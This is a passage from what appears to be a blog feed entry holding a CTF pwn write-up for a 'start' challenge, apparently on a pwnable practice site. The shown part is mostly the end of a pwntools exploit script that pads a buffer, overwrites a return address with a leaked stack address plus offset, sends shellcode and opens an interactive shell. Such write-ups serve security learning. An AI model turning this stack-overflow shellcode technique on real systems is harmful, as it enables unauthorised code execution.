p32(int.from_bytes(stack_addr, <span class="string">&#x27;little&#x27;</span>) + <span class="number">20</span>)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x14</span> + shellcode_addr + shellcode</span><br><span class="line">rem.sendline(payload)</span><br><span class="line"></span><br><span class="line">rem.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/11/04/PWN/Pwnable_xyz/start/3.png" class></strong></p>
-]]></content>
-      <categories>
-        <category>PWN</category>
-        <category>Pwnable.xyz</category>
       </categories>
       <tags>
         <tag>PWN</tag>
